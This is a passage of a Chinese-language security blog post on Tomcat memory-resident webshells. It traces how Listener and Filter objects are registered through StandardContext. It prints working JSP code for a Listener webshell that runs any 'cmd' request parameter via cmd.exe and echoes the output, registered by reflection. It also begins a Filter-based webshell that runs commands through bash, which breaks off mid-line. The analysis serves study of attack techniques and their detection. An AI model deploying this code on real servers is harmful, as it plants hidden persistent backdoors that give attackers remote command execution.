alt="image.png"><br>在<code>StandardHostValve</code>中调用了<code>fireRequestInitEvent</code>进而调用了<code>getApplicationEventListeners</code><br>而<code>getApplicationEventListeners</code>就是StandardContext中的一个方法，因此利用思路也很简单，可以通过获取StandardContext然后获取<code>getApplicationEventListeners</code>，进而添加恶意监听器</p>
<h2 id="StandardContext对象获取"><a href="#StandardContext对象获取" class="headerlink" title="StandardContext对象获取"></a>StandardContext对象获取</h2><p>因此现在的问题是如何获取StandardContext对象：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>方式一是以request对象为入口构造的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673109257314-9ad62bb7-f5c7-4c68-abab-1e6741a7a668.png#averageHue=%23435043&clientId=uf1cb3a1c-b03a-4&from=paste&height=196&id=u8171da12&name=image.png&originHeight=245&originWidth=878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36227&status=done&style=none&taskId=u256a9a93-29ff-432d-83b7-416eaea4b2d&title=&width=702.4" alt="image.png"><br>首先根据request对象反射获取request属性，然后再调用getContext方法获取StandardContext对象，溯源就可以发现StandardContext是Context的实现类，getContext方法返回的就是一个Context对象<br>方式二：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure>
<p>方式二是以Thread为入口进行构造的，和上面的原理一样，也是一步步往上去找，会发现都对应了起来</p>
<h2 id="内存马分析"><a href="#内存马分析" class="headerlink" title="内存马分析"></a>内存马分析</h2><p>根据这两种方法可以写出一个Listener内存马：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="comment">//定义了一个Listen监听Servlet的销毁事件</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="comment">//获取HttpServletRequest对象，用于RCE</span></span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//指令结果的输入流</span></span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">scanner.useDelimiter命令在于设置当前scanner的分隔符,默认是空格,\\A为正则表达式,表示从字符头开始</span></span><br><span class="line"><span class="comment">这条语句的整体意思就是读取所有输入,包括回车换行符</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="comment">//获得结果</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="comment">//获取request对象</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                    <span class="comment">//回显技术</span></span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (NoSuchFieldException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (IllegalAccessException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%<span class="comment">//添加恶意Listener</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">MyListener</span> <span class="variable">listenerDemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyListener</span>();</span><br><span class="line"><span class="comment">//在这里调用StandardContext进行添加</span></span><br><span class="line">    context.addApplicationEventListener(listenerDemo);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<h1 id="x2F-Filter型内存马分析"><a href="#x2F-Filter型内存马分析" class="headerlink" title="&#x2F;Filter型内存马分析"></a>&#x2F;Filter型内存马分析</h1><p>按照上面所讲的正常流程，Listen过后就是经过Filter过滤器处理请求，和Listen对应，Filter肯定也可以注入内存马，因为Filter有doFilter方法，用来将请求放行</p>
<h2 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h2><p>首先准备一个正常的filterdemo：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kino;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filtertest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;filter初始化&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;doFilter过滤&quot;</span>);</span><br><span class="line">        <span class="comment">//放行</span></span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;filter销毁&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注册filter:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>TestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在Dofilter处下查看调用栈：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673204841745-8ff49412-820a-4001-913a-b2075072b8c3.png#averageHue=%233c4043&clientId=ub669a667-2116-4&from=paste&height=479&id=ucbfbb19b&name=image.png&originHeight=599&originWidth=1340&originalType=binary&ratio=1&rotation=0&showTitle=false&size=120454&status=done&style=none&taskId=u9ee75e65-9a9d-49b1-92a6-28c66b73e38&title=&width=1072" alt="image.png"><br>最后一步是在ApplicationFilterChain类中调用了dofilter方法,并且通过一个<code>ApplicationFilterConfig</code>对象来获取所有的filters<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673205125287-18afe84e-7731-4f6f-a4ff-4dad0a3553c4.png#averageHue=%232e2c2c&clientId=ub669a667-2116-4&from=paste&height=449&id=uaafce7eb&name=image.png&originHeight=561&originWidth=1340&originalType=binary&ratio=1&rotation=0&showTitle=false&size=113363&status=done&style=none&taskId=ua369836f-860d-4c29-96f2-f25962f373b&title=&width=1072" alt="image.png"><br>溯源发现filters数组其实是一个<code>ApplicationFilterConfig[]</code>对象数组：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673205217370-1cdf0d97-f234-4d71-8a01-88e63c6aed10.png#averageHue=%232c2c2c&clientId=ub669a667-2116-4&from=paste&height=106&id=u5e66adbf&name=image.png&originHeight=133&originWidth=1121&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18063&status=done&style=none&taskId=u4296252d-b923-4860-8e5e-a25516cb07e&title=&width=896.8" alt="image.png"><br>继续往回走，发现在该类调用了internalDoFilter方法，个人理解为是一个对doFilter进行初始化的方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673205264636-25ab20bf-4d65-41a2-8d9b-657350b9342c.png#averageHue=%232b2b2b&clientId=ub669a667-2116-4&from=paste&height=130&id=u7f06e725&name=image.png&originHeight=162&originWidth=1283&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15307&status=done&style=none&taskId=u5aae3fd7-2ee4-456c-a372-9ee93ca4883&title=&width=1026.4" alt="image.png"><br>继续往回走发现调用了StandrdWrapperValue类中的<code>filterChain.doFilter</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673205400465-f9a3280b-33c9-4d98-965c-a193807df43e.png#averageHue=%2375624a&clientId=ub669a667-2116-4&from=paste&height=126&id=uac01feee&name=image.png&originHeight=158&originWidth=1207&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25109&status=done&style=none&taskId=u66415961-57e9-49a7-8b34-5629bfdc47c&title=&width=965.6" alt="image.png"><br>这里的filterChain是通过<code>createFilterChain</code>方法所得到的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673205572083-b5d29508-68fd-4f68-b624-0e22a9329d01.png#averageHue=%232d2d2d&clientId=ub669a667-2116-4&from=paste&height=107&id=u76fba8b0&name=image.png&originHeight=134&originWidth=1164&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28112&status=done&style=none&taskId=uca8ed300-a994-4466-9c32-ee5a2ef5387&title=&width=931.2" alt="image.png"><br>而这个filterChain中存放的就是我们所定义的filter，可以看到filter是一个ApplicationFIlterConfig类型的数组<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673205615841-d5d99592-49d9-4a66-b5e6-cbeff4eb90ad.png#averageHue=%234b4e4d&clientId=ub669a667-2116-4&from=paste&height=238&id=uaeeb0770&name=image.png&originHeight=297&originWidth=1192&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54302&status=done&style=none&taskId=ubebe86fb-f19b-4bdd-ade5-dd7af8cf68a&title=&width=953.6" alt="image.png"><br>接下来分析一下createFilterChain是如何将我们的filter添加进ApplicationFIlterConfig的，首先先获取了Request对象，实际上就是一个HttpServlet，然后通过HttpServlet获取了Filterchain：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673254199954-3e64a1fd-794c-4d3c-bc70-4f5e2f4d381d.png#averageHue=%237e684e&clientId=ufa7886f0-5097-4&from=paste&height=531&id=u097c5541&name=image.png&originHeight=664&originWidth=1365&originalType=binary&ratio=1&rotation=0&showTitle=false&size=110142&status=done&style=none&taskId=u1dfe41db-c00e-45da-98e4-c4e989c01c6&title=&width=1092" alt="image.png"><br>然后重点来了，用StandradContext获取了FilterMap数组：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673254393227-aff8988c-7ab5-4bca-9813-c6a6a1307b9f.png#averageHue=%23736752&clientId=ufa7886f0-5097-4&from=paste&height=80&id=u0095a453&name=image.png&originHeight=100&originWidth=1272&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26415&status=done&style=none&taskId=u95d6742a-612d-48c2-a963-73b2e28d897&title=&width=1017.6" alt="image.png"><br>后续通过FIlterMap数组找到了FilterConfig数组，然后把filterConfig放入了filterchain中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673255117106-b5bd734f-f244-4870-ae76-b0406fce0c52.png#averageHue=%237e6f43&clientId=uf301063d-8239-4&from=paste&height=248&id=u4150563a&name=image.png&originHeight=310&originWidth=1407&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46298&status=done&style=none&taskId=u64906a70-879b-4ee6-8edf-e02dec8850f&title=&width=1125.6" alt="image.png"><br>这里的context就是上文的StandradContext了，跟进addFilter方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673255745176-be43fed9-d21e-4c8a-b321-8da6091be1d1.png#averageHue=%232e2c2c&clientId=u05a7cc66-79ba-4&from=paste&height=383&id=ue8dd646e&name=image.png&originHeight=479&originWidth=1328&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72335&status=done&style=none&taskId=u28aca988-22cf-4187-8894-9e1704db647&title=&width=1062.4" alt="image.png"><br>在这做的事情其实和上一步一样，遍历filter然后放入ApplicationFilterConfig[]中，这个filters数组就是上面说的ApplicationFilterConfig[]数组对象，通过调试可以发现有几个比较显眼的对象名称：</p>
<ul>
<li>filterMaps拿名字</li>
<li>filterConfigs拿过滤器（值）</li>
</ul>
<p>这两个变量在StandradContext中都有定义，其中还有个<strong>filterDefs</strong>也是一个重要变量，这个后续会讲：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673256006139-0903ad98-de27-4f7c-8dd0-e4fa20892455.png#averageHue=%233b4045&clientId=u05a7cc66-79ba-4&from=paste&height=156&id=u1a6b1487&name=image.png&originHeight=195&originWidth=1192&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59603&status=done&style=none&taskId=u92e4ee46-9299-4aff-991a-4ccab84549b&title=&width=953.6" alt="image.png"></p>
<h2 id="FilterMap"><a href="#FilterMap" class="headerlink" title="FilterMap"></a>FilterMap</h2><p>filterMap在上文中也说了，是一个数组，存放着过滤器的名称，是用来拿名称的,既然都存放在StandradContext中，那么肯定可以通过StandradContext去添加：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673256518508-b7912727-9d98-4315-b5c7-45a05e529104.png#averageHue=%232d2d2c&clientId=u05a7cc66-79ba-4&from=paste&height=186&id=u294f5b48&name=image.png&originHeight=232&originWidth=890&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30251&status=done&style=none&taskId=u5f9e3f3c-8bf0-4c1d-a28b-c9781ea59eb&title=&width=712" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673256527665-a69901dd-63fc-4c1e-888f-903240a266b3.png#averageHue=%232e2d2c&clientId=u05a7cc66-79ba-4&from=paste&height=188&id=ubcb7f622&name=image.png&originHeight=235&originWidth=770&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32280&status=done&style=none&taskId=u025a7087-c3e0-40d6-bca8-9336ac8b9d1&title=&width=616" alt="image.png"></p>
<h2 id="FilterConfigs"><a href="#FilterConfigs" class="headerlink" title="FilterConfigs"></a>FilterConfigs</h2><p>StandradContext既然能添加filtermaps，那应该也存在对FilterConfigs进行操作的方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673256798981-b07f9b91-0644-47db-92ba-b40c4dda169a.png#averageHue=%23302b2a&clientId=u05a7cc66-79ba-4&from=paste&height=416&id=ue9f34853&name=image.png&originHeight=520&originWidth=1195&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99594&status=done&style=none&taskId=uadd63603-4c68-423a-bef2-8145ded9fd8&title=&width=956" alt="image.png"><br>找到溢出filterStart方法，其中调用了filterConfigs.put方法添加，从源码不难看懂这是初始化时候做的事情，因此断电重新启动一次调试：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673256926110-acfc756b-9bdc-432e-82bb-8776ece03939.png#averageHue=%2382754c&clientId=u05a7cc66-79ba-4&from=paste&height=423&id=u78646cc8&name=image.png&originHeight=529&originWidth=1442&originalType=binary&ratio=1&rotation=0&showTitle=false&size=131021&status=done&style=none&taskId=u1808c543-752b-4a18-ac61-ececfe87723&title=&width=1153.6" alt="image.png"><br>filterDefs中存放了我们的TestFilter和TestFIlter的过滤器，遍历filterdefs，拿到了key（Testfilter）和value，之后通过new一个ApplicationConfig将值存入filterConfig中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673257013970-a20d613d-baf8-40aa-b5ba-684432c48128.png#averageHue=%23302b2a&clientId=u05a7cc66-79ba-4&from=paste&height=306&id=u163c5b5b&name=image.png&originHeight=383&originWidth=1223&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81820&status=done&style=none&taskId=u541e5f81-9fa6-4f1f-bb0c-43c5349f321&title=&width=978.4" alt="image.png"></p>
<h2 id="FIlterDefs"><a href="#FIlterDefs" class="headerlink" title="FIlterDefs"></a>FIlterDefs</h2><p>通过分析，其实发现filterdefs才是真正存放了filter的地方，在StandradContext中也有添加filterDefs的方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673257142815-56c9ea98-ab05-4f38-bdfd-7a650af01e21.png#averageHue=%232e2d2c&clientId=u05a7cc66-79ba-4&from=paste&height=215&id=u27de5180&name=image.png&originHeight=269&originWidth=856&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30240&status=done&style=none&taskId=u7d070eac-8250-48b5-b0f8-f5cbb03b64f&title=&width=684.8" alt="image.png"><br>可以想到，tomcat是从web.xml中读取的filter，然后加入了filterMap和filterDef变量中，以下对应着这两个变量<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673257180238-9bdf74fe-6e64-4b6b-8649-e4eab2f67194.png#averageHue=%23302f2c&clientId=u05a7cc66-79ba-4&from=paste&height=178&id=ud45e4874&name=image.png&originHeight=222&originWidth=678&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26681&status=done&style=none&taskId=ue73fb85f-660a-4076-8d7f-5e1969dbf07&title=&width=542.4" alt="image.png"><br>其中filter-mapping对应着filterMap了</p>
<h2 id="内存马分析-1"><a href="#内存马分析-1" class="headerlink" title="内存马分析"></a>内存马分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    <span class="comment">//以上步骤用于获取StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line">    <span class="comment">//反射获取filterconfig</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="comment">//开始添加Filter过滤器</span></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="comment">//定义了恶意的FIlter过滤器，在dofilter方法执行恶意代码</span></span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;bash&quot;</span>,<span 